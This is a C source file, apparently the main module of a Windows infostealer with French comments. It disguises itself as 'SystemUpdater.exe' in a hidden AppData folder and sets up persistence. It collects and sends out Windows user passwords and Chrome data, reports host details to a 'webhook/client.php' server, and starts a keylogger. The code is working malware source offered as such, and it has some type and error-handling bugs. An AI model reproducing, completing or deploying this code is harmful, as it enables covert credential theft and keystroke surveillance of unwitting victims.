#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <io.h>

#include "computer_informations.c"
#include "windows_users_passwords.c"
#include "chrome_data.c"
#include "persistance.c"
#include "keylogger.c"
#include <stdlib.h>

#include "../include/http.h"
#include "../include/structures.h" //structure COMPUTER_INFOS

int is_first_execution(char *current_executable_path, char *softwareDataDirectory, char *fake_executable_name)
{

    /*Vérifier que c'est la première execution en regardant si le le la faux executable du logiciel existe déja */

    char fake_executable_path[256];
    snprintf(fake_executable_path, 256, "%s\\%s", softwareDataDirectory, fake_executable_name);
    return _access(fake_executable_path, 0); // de io.h, pour vérifier si le fichier existe
};

int main(void)
{

    char fake_executable_name[] = "SystemUpdater.exe";

    char current_executable_path[MAX_PATH];
    GetModuleFileName(NULL, current_executable_path, MAX_PATH);

    // COMPUTER_INFOS est une structure de ../include/structures.h
    COMPUTER_INFOS computer;
    get_computer_info(&computer);

    char softwareDataDirectory[1024];
    snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);

    //creation d'un uid
    srand( time( NULL ) );
    int random_uid = rand() % 10000001;
    char uid[30]; // random entre 0 et 10000
    snprintf(uid, 30, "%d", random_uid);

    char *filename = "user";
        char uid_file_path[500];
    snprintf(uid_file_path, 500 , "%s\\%s", softwareDataDirectory, filename);

    if (is_first_execution(current_executable_path, softwareDataDirectory, fake_executable_name))
    {
        // je créer le dossier du logiciel
        CreateDirectory(softwareDataDirectory, NULL);
        set_persistance(softwareDataDirectory, current_executable_path, fake_executable_name); // fonction à amméliorer pour que si refus des droits admin, dossier de démarage simplement


        // Enregistrer l'uid dans dans le repertoire du virus un fichier
        FILE *file = fopen(uid_file_path, "w");
        if (file == NULL) {
            perror("Erreur à l'ouverture du fichier en écriture");
        }
        fprintf(file, "%d", uid);
        fclose(file);

        save_and_send_windows_users_password(&computer);
        send_chrome_data_files(&computer);

    
    } else{

        // on recupere l'uid qui est censé exister
        FILE *file = fopen(uid_file_path, "r");
    
       if (file == NULL) {
            perror("Erreur à l'ouverture du fichier en lecture");
        }

        char buffer[256];
        fgets(buffer, sizeof(buffer), file);
        printf("%s", buffer);

        snprintf(uid, sizeof(uid), "%s", buffer);
        fclose(file);
    }

    printf("\nComputer Name: %s\n", computer.computer_name);
    printf("Username: %s\n", computer.username);
    printf("Windows Version: %s\n", computer.windows_version);
    printf("Architecture: %s\n\n", computer.architecture);
    printf("UID: %s\n\n", uid);

    char client_data[1000];

    snprintf(client_data, 1000,  "{\"uid\":\"%d\", \"computer_name\": \"%s\", \"username\": \"%s\", \"windows_version\": \"%s\", \"architecture\": \"%s\"}", uid, computer.computer_name,  computer.username, computer.windows_version, computer.architecture);
    send_to_server("webhook/client.php", client_data);


    start_keylogger();

    return 0;
}